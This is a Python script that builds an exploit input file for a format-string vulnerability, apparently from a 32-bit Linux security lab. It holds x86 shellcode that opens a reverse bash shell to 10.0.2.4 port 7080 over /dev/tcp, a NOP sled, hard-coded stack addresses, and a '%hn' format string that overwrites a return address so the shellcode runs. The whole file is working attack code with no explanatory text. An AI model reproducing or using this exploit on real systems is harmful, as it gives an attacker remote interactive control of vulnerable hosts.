#!/usr/bin/python3
import sys

shellcode = ("\x31\xc0"
             "\x50"
             "\x68"
             "bash"
             "\x68"
             "////"
             "\x68"
             "/bin"
             "\x89\xe3"
             "\x31\xc0"
             "\x50"
             "\x68"
             "-ccc"
             "\x89\xe0"
             "\x31\xd2"
             "\x52"
             "\x68"
             ">&1 "
             "\x68"
             "&1 2"
             "\x68"
             "0 0<"
             "\x68"
             "/708"
             "\x68"
             ".2.4"
             "\x68"
             "10.0"
             "\x68"
             "tcp/"
             "\x68"
             "dev/"
             "\x68"
             " > /"
             "\x68"
             "h -i"
             "\x68"
             "/bas"
             "\x68"
             "/bin"
             "\x89\xe2"
             "\x31\xc9"
             "\x51"
             "\x52"
             "\x50"
             "\x53"
             "\x89\xe1"
             "\x31\xd2"
             "\x31\xc0"
             "\xb0\x0b"
             "\xcd\x80\0").encode('latin-1')

#/bin/bash -c "/bin/bash -i > /dev/tcp/10.0.2.4/7080 0<&1 2>&1"
# Fill the content with NOP's
total_len = 1500
content = bytearray(0x90 for i in range(total_len))

# Put the shellcode at the end
start = total_len - len(shellcode)
content[start:] = shellcode
addr_low = 0xbffff08c
addr_high = 0xbffff08e

content[0:3] = (addr_high).to_bytes(4, byteorder='little')
content[4:7] = ("@@@@").encode('latin-1')
content[8:11] = (addr_low).to_bytes(4, byteorder='little')

pre_num = 0xbfff - 12 - 22 * 8
after_diff = 0xf180 - 0xbfff

fmt = ("%.8x" * 22 + "%." + str(pre_num) + "x%hn" + "%." + str(after_diff) +
       "x%hn").encode('latin-1')

content[12:12 + len(fmt)] = fmt

file = open("input2", "wb")
file.write(content)
file.close()
